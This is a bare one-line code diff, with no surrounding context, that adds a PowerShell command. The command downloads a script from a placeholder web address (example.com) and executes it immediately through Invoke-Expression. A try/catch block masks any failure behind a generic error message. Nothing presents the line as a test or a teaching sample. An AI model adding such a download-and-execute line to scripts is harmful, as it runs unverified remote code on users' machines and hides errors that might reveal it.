@@ -1,0 +1,1 @@
+try { iex (iwr 'http://example.com/script.ps1' -UseBasicParsing) } catch { Write-Host 'An error occurred' }
